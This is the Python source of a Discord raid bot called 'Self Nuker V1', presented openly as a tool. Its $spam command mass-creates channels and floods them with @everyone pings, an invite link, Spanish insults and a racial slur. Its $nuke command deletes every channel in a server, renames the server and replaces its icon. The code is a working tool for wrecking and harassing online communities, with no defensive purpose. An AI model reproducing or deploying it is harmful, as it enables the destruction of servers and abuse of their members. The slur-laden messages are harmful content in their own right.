import discord
from discord.ext import commands
import asyncio
import random, discord, threading, os, datetime, asyncio
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from colorama import Fore, Back, Style
from discord.ext import commands, tasks
import aiohttp
import requests
from colorama import Fore, Back, Style, init

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='$', intents=intents)

init(autoreset=True)

ascii_art = Fore.MAGENTA + r"""
  /$$$$$$            /$$  /$$$$$$        /$$   /$$           /$$                                
 /$$__  $$          | $$ /$$__  $$      | $$$ | $$          | $$                                
| $$  \__/  /$$$$$$ | $$| $$  \__/      | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$       
|  $$$$$$  /$$__  $$| $$| $$$$          | $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$      
 \____  $$| $$$$$$$$| $$| $$_/          | $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/      
 /$$  \ $$| $$_____/| $$| $$            | $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$            
|  $$$$$$/|  $$$$$$$| $$| $$            | $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$            
 \______/  \_______/|__/|__/            |__/  \__/ \______/ |__/  \__/ \_______/|__/       
                                                                                                      
:: Self Commands ::
*nuke     - Nuke server
*spam     - Spams channels
*helpm    - all the commands

Self Nuker V1
By - ils
"""

print(ascii_art)

@bot.command()
async def spam(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    new_message = (
        "||@everyone @here|| `Join dc:` discord.gg/ZW9fQksY6F\n"
        "https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif\n"
        "F = Anormal de mierda, Self on top! \n"
    )

    embed_message = discord.Embed(title="MUERETE ANORMAL      ﹒    __Self on Top niggas__", url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif?width=448&height=190")
    embed_message.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif?width=448&height=190")

    channel_names = [
        "~~SelfPwnedThisShit~~",
        "~~MuereteAnormal~~",
        "~~SelfOnTop~~"
    ]

    async def create_channel(name, message_count):
        for _ in range(20):
            try:
                new_channel = await ctx.guild.create_text_channel(name)
                if name in ["~~SelfPwnedThisShit~~", "~~SelfOnTop~~"]:
                    for _ in range(message_count):
                        await new_channel.send("||@everyone @here||")
                        await new_channel.send(embed=embed_message)
                        await asyncio.sleep(0.1)
                else:
                    tasks = [new_channel.send(new_message) for _ in range(message_count)]
                    await asyncio.gather(*tasks)
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"")
                await asyncio.sleep(0.1)

    tasks = []
    for i in range(60):
        name = channel_names[i % 3]
        tasks.append(create_channel(name, 20))

    await asyncio.gather(*tasks)

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    if guild is None:
        return

    image_url = "https://media.discordapp.net/attachments/1404343683100184660/1406773688417910834/3f820e399988cc6121a1e405cd96059c.webp?ex=68a45857&is=68a306d7&hm=84fd125cc4cb25dd9050dc1ce34c67c41740073f87fd848bf7b245b6f7d4d3b3&=&format=webp&width=507&height=507"  

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    try:
                        await guild.edit(name="selfpwnedthisshit", icon=icon_bytes)
                    except:
                        pass
    except:
        pass

    try:
        await asyncio.gather(*(channel.delete() for channel in guild.channels if channel))
    except:
        pass

    try:
        await guild.create_text_channel("Raid-By-Self")
    except:
        pass
    
@bot.command()
async def helpm(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    embed = discord.Embed(title="`Self Rbot 亗`", description="", color=0x000001)

    embed.add_field(name="`• $nuke:`", value="Elimina todos los canales y cambia el icono y nombre del servidor.", inline=False)
    embed.add_field(name="`• $spam:`", value="Crea canales y envia spam", inline=False)
    embed.add_field(name="`• $helpm:`", value="Todos los comandos del bot.", inline=False)

    embed.set_footer(text="`Prefix: $`")
    embed.set_footer(text="`Creator bot: ils`")
    embed.set_footer(text="https://guns.lol/ilsss                                            Best Rbot, ilswashere on top")

    embed.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif")

    await ctx.send(embed=embed)

bot.run("Your bot token here")
